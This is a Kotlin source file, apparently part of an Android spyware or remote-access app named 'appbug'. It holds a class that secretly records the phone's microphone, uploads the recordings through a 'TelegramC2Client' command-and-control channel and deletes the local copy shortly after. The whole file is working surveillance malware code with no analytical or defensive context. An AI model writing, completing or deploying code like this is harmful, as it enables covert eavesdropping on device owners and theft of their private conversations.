package com.mzkyzak.appbug

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.File

class AudioRecorderManager(private val context: Context, private val c2Client: TelegramC2Client) {
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: String = ""
    private val handler = Handler(Looper.getMainLooper())

    fun startRecording(durationMillis: Long = 10000) {
        stopRecording()
        
        outputFile = "${context.cacheDir.absolutePath}/rec_${System.currentTimeMillis()}.amr"
        
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setOutputFile(outputFile)
            
            try {
                prepare()
                start()
                Log.d("AudioRecorder", "Recording started")
            } catch (e: Exception) {
                Log.e("AudioRecorder", "Start failed", e)
                c2Client.sendMessage("<b>[Audio]</b> Start failed: ${e.message}")
                return
            }
        }

        handler.postDelayed({
            stopRecording()
        }, durationMillis)
    }

    private fun stopRecording() {
        handler.removeCallbacksAndMessages(null)
        try {
            mediaRecorder?.apply {
                try {
                    stop()
                } catch (e: Exception) {
                    Log.e("AudioRecorder", "Stop failed (recording too short?)")
                }
                release()
            }
            mediaRecorder = null
            
            if (outputFile.isNotEmpty()) {
                val file = File(outputFile)
                if (file.exists() && file.length() > 100) {
                    val bytes = file.readBytes()
                    c2Client.sendVoice("audio_${System.currentTimeMillis()}.ogg", bytes)
                    handler.postDelayed({ file.delete() }, 5000)
                }
                outputFile = ""
            }
        } catch (e: Exception) {
            Log.e("AudioRecorder", "General stop failed", e)
        }
    }
}
